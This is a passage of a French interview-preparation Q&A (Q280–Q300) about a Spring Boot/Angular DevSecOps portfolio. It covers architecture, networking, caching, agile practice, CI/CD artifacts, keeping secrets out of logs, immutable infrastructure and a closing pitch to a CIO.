**Dans ce projet** : la structure suit partiellement cette architecture — les services (`ProjectService`) sont découplés des controllers et des repositories via les interfaces Spring Data. Pour une architecture hexagonale stricte, on renommerait les interfaces en `ProjectPort` et séparerait en packages `domain`, `application`, `infrastructure`.

---

### Q280 — Qu'est-ce que les 12-Factor App et lesquels avez-vous appliqués ?

Les 12 facteurs sont un manifeste (Heroku, 2011) pour construire des applications cloud-native scalables.

| Facteur | Application dans ce projet |
|---------|--------------------------|
| **I — Codebase** | Un seul repo Git (monorepo frontend + backend) |
| **II — Dependencies** | `pom.xml` et `package.json` déclarent toutes les dépendances |
| **III — Config** | Variables d'environnement pour les secrets, URLs, profiles |
| **IV — Backing services** | PostgreSQL, Redis, Kafka traités comme des ressources attachées |
| **V — Build/Release/Run** | Build → image Docker (ECR), Release → tag SHA, Run → EC2 |
| **VI — Processes** | Spring Boot stateless, état dans PostgreSQL/Redis |
| **VII — Port binding** | Spring Boot écoute sur `PORT=8080` via variable d'env |
| **VIII — Concurrency** | Virtual Threads pour scale horizontalement |
| **IX — Disposability** | Arrêt gracieux (`SIGTERM` → Spring Boot shutdown hook) |
| **X — Dev/Prod parity** | Testcontainers = même PostgreSQL en test et prod |
| **XI — Logs** | Logs JSON structurés vers stdout → CloudWatch |
| **XII — Admin processes** | Migrations Flyway = tâche admin séparée (init container K8s) |

---

### Q281 — Qu'est-ce que l'Event-Driven Architecture et comment ce projet l'utilise-t-il ?

**Event-Driven Architecture (EDA)** : les composants communiquent via des événements publiés sur un bus de messages, plutôt que par des appels directs (couplage temporel et spatial réduit).

**Avantages** :
- **Découplage** : le producer d'événements ne connaît pas les consumers
- **Extensibilité** : ajouter un consumer ne modifie pas le producer
- **Résilience** : si un consumer est down, les événements s'accumulent dans la queue
- **Audit trail** : l'historique des événements EST l'historique métier

**Dans ce projet** (Phase 10 — Kafka) :
```
Admin crée un projet → ProjectService.createProject()
  → publie ProjectCreatedEvent sur portfolio.projects.created
     → AuditEventConsumer loggue l'événement
     → (futur) NotificationConsumer envoie un email
     → (futur) SearchIndexConsumer met à jour Elasticsearch
```

Le ProductService ne sait pas qui consomme ses événements → extension sans modification.

---

## Réseau & Protocoles

### Q282 — Comment implémenteriez-vous WebSockets dans ce projet Spring Boot + Angular ?

**WebSockets** permettent une connexion bidirectionnelle persistante entre client et serveur — idéal pour le temps réel (notifications, chat, live dashboard).

**Backend Spring Boot** :
```java
@Configuration
@EnableWebSocketMessageBroker
public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
    @Override
    public void registerStompEndpoints(StompEndpointRegistry registry) {
        registry.addEndpoint("/ws").setAllowedOriginPatterns("*").withSockJS();
    }
    @Override
    public void configureMessageBroker(MessageBrokerRegistry registry) {
        registry.enableSimpleBroker("/topic");  // server → client
        registry.setApplicationDestinationPrefixes("/app"); // client → server
    }
}

// Envoyer une notification depuis le service
messagingTemplate.convertAndSend("/topic/projects", newProject);
```

**Frontend Angular** :
```typescript
const client = new Client({ brokerURL: 'ws://localhost:8080/ws' });
client.onConnect = () => {
  client.subscribe('/topic/projects', (msg) => {
    this.projects.update(list => [...list, JSON.parse(msg.body)]);
  });
};
```

**Cas d'usage** : notifications en temps réel quand l'admin crée un projet (visible instantanément sans refresh).

---

### Q283 — Quelle est la différence entre gRPC et REST, et quand utiliser gRPC ?

**REST** : HTTP/1.1 ou HTTP/2, JSON, stateless, large adoption.

**gRPC** (Google Remote Procedure Call) :
- Protocole binaire (Protocol Buffers) → 5-10x plus compact que JSON
- HTTP/2 natif → multiplexing, streaming bidirectionnel
- Schema strict (`.proto`) → génération de code client dans 10+ langages
- Streaming natif (server-streaming, client-streaming, bidirectionnel)

```protobuf
// portfolio.proto
service ProjectService {
  rpc GetProject(GetProjectRequest) returns (Project);
  rpc StreamProjects(StreamRequest) returns (stream Project); // streaming
}
```

**Quand gRPC ?**
- Communication inter-services (microservices) → performances critiques, schema strict
- Streaming (données en temps réel, logs en continu)
- Mobile → payload réduit, batterie économisée

**Quand REST ?**
- API publique (navigateurs, partenaires, outils tiers) → REST universellement supporté
- Simplicité → JSON lisible, curl, Postman
- Ce projet → REST (API consommée par un navigateur Angular)

---

### Q284 — Qu'est-ce que les stratégies de cache HTTP (Cache-Control, ETag, Last-Modified) ?

**Cache-Control** : directive principale contrôlant le comportement du cache.
```
Cache-Control: public, max-age=31536000, immutable
# Les fichiers Angular avec hash (main.abc123.js) sont immuables → 1 an de cache

Cache-Control: no-cache
# Toujours revalider avec le serveur (mais peut utiliser le cache si validé)

Cache-Control: no-store
# Jamais mettre en cache (données sensibles, réponses auth)
```

**ETag** : empreinte du contenu. Si le contenu n'a pas changé, le serveur répond 304 Not Modified.
```
GET /api/projects
→ 200 OK, ETag: "abc123", Cache-Control: max-age=60

GET /api/projects (60s après)
→ If-None-Match: "abc123"
  ← 304 Not Modified (pas de body → économie de bande passante)
```

**Dans ce projet** :
- Assets Angular statiques → `max-age=31536000, immutable` (hash dans le nom)
- `index.html` → `no-cache` (référence les assets, doit être toujours frais)
- API REST → `Cache-Control: no-store` (données dynamiques)

---

### Q285 — Quels sont les algorithmes de load balancing et leurs cas d'usage ?

| Algorithme | Fonctionnement | Cas d'usage |
|-----------|---------------|-------------|
| **Round Robin** | Tour à tour : req1→s1, req2→s2, req3→s3... | Instances homogènes, requêtes uniformes |
| **Least Connections** | Vers l'instance avec le moins de connexions actives | Requêtes de durée variable |
| **IP Hash** | L'IP client détermine toujours la même instance | Sessions sticky (sans cache partagé) |
| **Weighted Round Robin** | Round Robin pondéré par capacité | Instances hétérogènes (s1=2x s2) |
| **Random** | Instance aléatoire | Cas simples, performances similaires à Round Robin |
| **Least Response Time** | Vers l'instance la plus rapide | Latence critique |

**AWS ALB** : utilise Least Outstanding Requests par défaut pour l'HTTP (meilleur que Round Robin).

**NGINX** dans ce projet : round-robin (upstream backend) entre les containers si on scalerait horizontalement. Actuellement : single backend, pas de LB applicatif.

---

## Soft Skills & Méthodo

### Q286 — Comment fonctionnez-vous en méthodologie Agile/Scrum ?

Scrum est un framework Agile avec des itérations courtes (Sprints de 2 semaines) et des cérémonies structurées.

**Cérémonies que j'applique** :
- **Sprint Planning** : sélectionner les User Stories du backlog, les estimer (story points ou t-shirt sizing), définir le Sprint Goal
- **Daily Standup** : 15 min max. "Ce que j'ai fait, ce que je vais faire, mes blocages." Pas de réunion de statut.
- **Sprint Review** : démonstration du travail réalisé aux stakeholders. Feedback direct.
- **Sprint Retrospective** : "Ce qui a bien marché / ce qu'on améliore / action concrète pour le prochain sprint"

**Dans ce projet** : travail en solo → pas de Scrum formel. Mais les commits Conventional Commits et le découpage en Phases (1-22) reflètent un découpage sprint-like : chaque phase a une définition claire de "Done".

**En équipe** : j'utilise le Kanban Board GitHub Projects pour visualiser le Work In Progress et limiter le WIP à 2 items par personne.

---

### Q287 — Comment faites-vous une bonne code review ?

Une code review efficace équilibre correction technique et préservation de la motivation.

**Ce que je vérifie** :
1. **Exactitude** : la logique est-elle correcte ? Les edge cases sont-ils gérés ?
2. **Sécurité** : inputs validés ? Secrets exposés ? Nouvelles CVEs ?
3. **Tests** : le comportement nouveau est-il couvert ? Les tests rouges existent ?
4. **Lisibilité** : je comprends le code en 30 secondes ? Les noms sont explicites ?
5. **Architecture** : respecte les patterns existants ? Pas de couplage introduit ?

**Ce que j'évite** :
- Commenter le style (c'est le rôle de Prettier/Checkstyle automatiques)
- Les "nitpicks" bloquants sur des questions de goût
- Bloquer une PR pour de la perfection quand le code est "assez bon"

**Format des commentaires** :
- `[Suggestion]` : idée, pas bloquant
- `[Question]` : je comprends pas, clarifie svp
- `[Bloquant]` : doit être corrigé avant merge (bug, sécurité)

---

### Q288 — Comment estimez-vous une tâche technique ?

Trois approches selon le contexte :

**Story Points (Fibonacci)** : estimation relative à une story de référence. "Si créer un CRUD simple = 3 points, ajouter Kafka = ?" Élimine le débat sur les heures réelles.

**T-shirt sizing** (XS/S/M/L/XL) : pour les estimations rapides en planning. M = une journée, L = une semaine, XL = à décomposer.

**Three-Point Estimation** : `(Optimiste + 4×Probable + Pessimiste) / 6`. Tient compte de l'incertitude.

**Règles personnelles** :
- Toujours décomposer jusqu'à des tâches de max 2 jours — si plus long, l'estimation est incertaine
- Inclure : tests, documentation, code review, déploiement (pas juste le code)
- Spike technique si incertitude haute : 1 jour d'exploration avant d'estimer
- Ne jamais estimer sous pression ou commiter une date sans avoir vu le code

---

### Q289 — Comment restez-vous organisé face à la complexité d'un projet comme celui-ci ?

**Documentation progressive** : chaque phase a son `docs/PHASEn-*.md` écrit *pendant* le développement, pas après. Quand je me retrouve à expliquer la même chose deux fois → je l'écris.

**Git comme carnet de bord** : les messages de commit Conventional Commits racontent l'histoire du projet. `git log --oneline` donne une vue chronologique lisible.

**Checklist de définition de "Done"** :
```
Pour chaque feature :
[ ] Code écrit et testé (unitaire + intégration)
[ ] CI verte
[ ] Déployé en dev
[ ] Documentation à jour
[ ] Pas de TODO ni de secret en clair
```

**Timeboxing** : chaque phase est bornée dans le temps (max 3-4 jours). Si ça prend plus → je documente l'état partiel et je continue — mieux vaut une phase à 80% et une prochaine phase que de bloquer indéfiniment.

---

### Q290 — Que faites-vous quand vous êtes bloqué sur un problème technique ?

**Processus en 5 étapes** :

1. **Isoler** (15 min) : reproduire le problème minimal (MCVE — Minimal Complete Verifiable Example). Supprimer tout ce qui ne reproduit pas le bug.

2. **Chercher** (30 min) : message d'erreur exact dans Google, Stack Overflow, GitHub Issues, documentation officielle. La plupart des problèmes ont déjà une solution publiée.

3. **Rubber ducking** : expliquer le problème à voix haute (à quelqu'un ou à soi-même). L'explication force à structurer la pensée.

4. **Changer d'approche** : si bloqué > 2h sur la même piste, remettre en question l'approche — peut-être que le problème est ailleurs.

5. **Demander** : formuler une question précise (contexte + ce que j'ai essayé + ce que j'attends). Une bonne question obtient une bonne réponse.

**Dans ce projet** : le problème K3s vs Docker Compose (Q15) a été résolu en changeant d'approche après 4h de debugging mémoire → pragmatisme > obstination.

---

## Performance & Cache

### Q291 — Quelles sont les stratégies de cache (cache-aside, write-through, write-behind) ?

**Cache-Aside** (Lazy Loading) — utilisé dans ce projet :
```
Lire → vérifier cache → HIT : retourner → MISS : lire DB, stocker en cache, retourner
Écrire → écrire DB + invalider cache (@CacheEvict)
```
Avantage : le cache ne contient que ce qui est lu. Inconvénient : first request toujours lente (cold start).

**Write-Through** :
```
Écrire → écrire cache ET DB simultanément → toujours cohérent
Lire → toujours dans le cache (si lu récemment)
```
Inconvénient : les données rarement lues occupent le cache.

**Write-Behind** (Write-Back) :
```
Écrire → écrire cache seulement → flush DB asynchrone
```
Avantage : très rapide en écriture. Risque de perte de données si le cache crashe avant le flush.

**Dans ce projet** : Cache-Aside via `@Cacheable` + `@CacheEvict`. Redis TTL de 5-10 min évite les données périmées sans nécessité de `@CacheEvict` explicite pour toutes les mutations.

---

### Q292 — Comment optimisez-vous le bundle Angular en production ?

**Configuration de base** (automatique avec `ng build --configuration=production`) :
- Tree-shaking : supprime le code non utilisé
- Minification + uglification (Terser)
- AOT compilation (plus de compilation JIT au runtime)
- Differential loading (ES2015+ pour les navigateurs modernes)

**Techniques supplémentaires appliquées** :

1. **Lazy loading** des routes (Q32) → bundle initial < 150KB
2. **`trackBy` dans les `@for`** → moins de re-rendus DOM
3. **`OnPush` Change Detection** → moins de cycles de détection
4. **`@defer (on viewport)`** (Q204) → composants lourds chargés à la demande
5. **Images WebP** via Lambda resize (Q52) → 30-50% plus légères
6. **Compression Gzip/Brotli** dans NGINX → réduction 70% de la taille de transfert

**Audit** :
```bash
ng build --stats-json
npx webpack-bundle-analyzer dist/stats.json
# Visualise quel module prend quelle taille → identifier les imports lourds
```

---

### Q293 — Qu'est-ce que le pattern Async Processing avec des queues et quand l'utiliser ?

**Problème** : une action utilisateur déclenche un traitement long (resize d'image, envoi d'email, génération de rapport). Faire attendre l'utilisateur = mauvaise UX.

**Solution** : découpler la requête HTTP de son traitement via une queue.

```
1. POST /upload → Spring Boot valide, sauvegarde le fichier → répond 202 Accepted
2. Spring Boot publie un message dans SQS/Kafka : "Image {id} à traiter"
3. Le user reçoit une réponse immédiate avec un job_id
4. Un worker Lambda/Spring Batch consomme la queue → traite l'image
5. Le worker notifie (WebSocket/SSE) quand le traitement est terminé
```

**Avantages** :
- Réponse immédiate (202) même si le traitement prend 30 secondes
- Retry automatique si le worker échoue
- Scalabilité : N workers pour N messages en parallèle
- Pic de charge absorbé par la queue (SQS = buffer illimité)

**Dans ce projet** : le Lambda image-resize est déclenché par S3 Event (pas de queue) — fonctionnel pour un faible volume. Pour des milliers d'images simultanées : S3 → SQS → Lambda (avec concurrence contrôlée).

---

## Situations finales

### Q294 — Vous rejoignez une équipe dont le pipeline CI/CD est cassé depuis 2 semaines. Que faites-vous ?

*(Question situationnelle — approche méthodique)*

**Jour 1 — Comprendre avant d'agir** :
1. Lire les logs des derniers runs échoués (ne pas supposer la cause)
2. Identifier le dernier commit "vert" — qu'est-ce qui a changé depuis ?
3. Parler à l'équipe : savent-ils pourquoi ? Ont-ils essayé quelque chose ?

**Jours 2-3 — Isoler la cause** :
- Classer : infrastructure (runner down), dépendance externe (rate limit), code (test cassé), config (secret expiré)
- Tester localement les étapes qui échouent

**Résoudre et restaurer la confiance** :
- Fix minimal pour débloquer → merge rapide
- Documenter la cause racine et la solution
- Proposer une alerte proactive (notification Slack si le pipeline est rouge > 1h)

**Ne pas faire** : réécrire tout le pipeline pour "le faire mieux" avant d'avoir déblooqué la situation. Prioriser le rétablissement, puis l'amélioration.

---

### Q295 — Comment aborderiez-vous une migration d'une application monolithique vers des microservices ?

**Approche "Strangler Fig Pattern"** (Martin Fowler) — ne jamais réécrire from scratch.

**Phase 1 — Analyser** :
- Cartographier les domaines métier (Domain-Driven Design) → identifier les bounded contexts
- Identifier les couplages forts → les garder ensemble
- Mesurer : quels modules ont le plus de changements ? Le plus de bugs ? Le plus de charge ?

**Phase 2 — Extraire progressivement** :
- Commencer par le module le moins couplé (ex: envoi d'email → Lambda)
- Ajouter une API Gateway devant le monolithe
- Extraire un service, le tester, puis le suivant

**Phase 3 — Synchroniser les données** :
- Éviter le "distributed monolith" (microservices qui partagent la même DB)
- Chaque service a sa propre DB
- Événements Kafka pour la cohérence éventuelle entre services

**Erreurs à éviter** :
- Tout extraire en même temps (trop de risque)
- Sous-estimer la complexité opérationnelle (N services = N pipelines CI/CD, N configs, N dashboards)
- Extraire sans critère de découpe → "nanoservices" inutilement complexes

---

### Q296 — Comment présenteriez-vous la valeur de ce projet DevSecOps à un DSI ?

*(Question de clôture — synthèse)*

---

## CI/CD & Artefacts

### Q297 — Comment fonctionnent les Artifacts et le cache dans GitHub Actions ?

**Artifacts** : fichiers persistés après la fin d'un job, téléchargeables depuis l'onglet Actions.
```yaml
- name: Upload JAR
  uses: actions/upload-artifact@v4
  with:
    name: backend-jar
    path: backend/target/*.jar
    retention-days: 7

- name: Download JAR (dans un autre job)
  uses: actions/download-artifact@v4
  with:
    name: backend-jar
```

**Cache** : accélère les builds en réutilisant les dépendances entre runs.
```yaml
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: ${{ runner.os }}-maven-
```

**Différence** : le cache est restauré entre les runs (même branche ou branche parente). Les artifacts sont des livrables à partager entre jobs ou à télécharger manuellement.

**Dans ce projet** : `actions/setup-java@v4` avec `cache: 'maven'` gère le cache Maven automatiquement. Le build CI backend passe de ~5 min à ~2 min grâce au cache des dépendances.

---

### Q298 — Comment évitez-vous la fuite de secrets dans les logs applicatifs ?

Les logs sont un vecteur de fuite de secrets très courant — stack traces, requêtes SQL, headers HTTP loggés par accident.

**Techniques appliquées dans ce projet** :

1. **Masquage Logback** (pattern de log) :
```xml
<pattern>%d{ISO8601} [%thread] %-5level %logger{36} - %msg%n</pattern>
<!-- Ne jamais logger : request body complet, headers Authorization, paramètres de connexion DB -->
```

2. **Exclusion des champs sensibles Jackson** :
```java
@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)
private String password;  // jamais sérialisé en JSON (= jamais loggé dans les réponses)
```

3. **Variables d'environnement, jamais de valeurs dans les logs** :
```java
log.info("Connexion DB établie sur {}", datasourceUrl);  // OK
log.info("Connexion DB: {} / {}", datasourceUrl, password);  // JAMAIS
```

4. **Gitleaks dans le CI** : scanne les commits pour détecter des patterns de secrets avant qu'ils atteignent le repo.
```yaml
- uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

### Q299 — Qu'est-ce que le principe de "Immutable Infrastructure" et comment ce projet s'y conforme-t-il ?

**Infrastructure immuable** : une instance en production n'est jamais modifiée. Si une configuration change, on détruit l'ancienne instance et on en crée une nouvelle identique.

**Bénéfices** :
- Élimine les "snowflake servers" (serveurs uniques avec des modifications manuelles accumulées)
- Déploiements reproductibles à 100% (pas de "ça marchait hier...")
- Rollback = redéployer l'image précédente, pas "annuler la modification"

**Dans ce projet** :

| Composant | Immuable ? | Détails |
|-----------|-----------|---------|
| Images Docker | ✅ Oui | Tag SHA immuable (`sha-abc123`), jamais de `:latest` en prod |
| EC2 | ⚠️ Partiel | L'instance est modifiée par `docker pull` au déploiement |
| Infrastructure Terraform | ✅ Oui | `terraform apply` recrée si la config change |
| `docker-compose.yml` | ⚠️ Modifiable | Idéalement rebuildé dans l'AMI |

**Évolution cible** : Packer pour construire des AMIs avec Docker + configuration inclus → l'EC2 est entièrement immuable, `terraform taint` + `terraform apply` = nouvelle instance propre.

---

## Question finale

### Q300 — En une phrase, quelle est votre philosophie du DevSecOps ?

"Le DevSecOps, c'est faire en sorte qu'écrire du code sécurisé, testé et déployable soit le **chemin de moindre résistance** pour un développeur — pas une contrainte supplémentaire imposée après coup."

Concrètement : si le pipeline CI fait échouer un build à cause d'une CVE critique en 2 minutes, avant que le développeur soit passé à autre chose, c'est une contrainte utile. Si un audit de sécurité bloque une release à J-1, c'est un dysfonctionnement organisationnel.

Ce projet incarne cette philosophie :
- Les tests, le SAST, le DAST, le scan de dépendances sont **automatiques** → zéro friction pour le développeur
- Le déploiement est **automatique** → la prod est toujours synchrone avec `main`
- La documentation est **dans le repo** → l'onboarding d'un nouveau développeur = `git clone` + lire les `docs/`

La sécurité et la qualité ne sont pas des phases du cycle de développement — ce sont des propriétés continues du système.

---

"Ce projet démontre concrètement trois valeurs business que chaque DSI mesure :

**1. Réduction du Time to Market** : 8 minutes du commit au déploiement en production. Sans CI/CD, ce délai peut être des jours voire des semaines. Sur 100 features dans l'année, c'est des mois gagnés.

**2. Réduction du risque** : chaque ligne de code est analysée automatiquement (SAST, DAST, CVE). En 2023, une CVE critique non patchée a coûté en moyenne 4.35 millions de dollars à l'entreprise impactée. Ici, Dependabot enverrait une alerte et un patch en moins de 24h.

**3. Réduction des coûts opérationnels** : l'infrastructure est décrite en code (Terraform). Créer un environnement identique pour l'équipe de test = 20 minutes. Sans IaC, c'est plusieurs jours de travail d'un administrateur système.

Ce portfolio n'est pas un démonstrateur académique — il est en production, il répond à de vraies requêtes HTTP, et chaque technologie est mesurable et auditable dans le code et les logs."
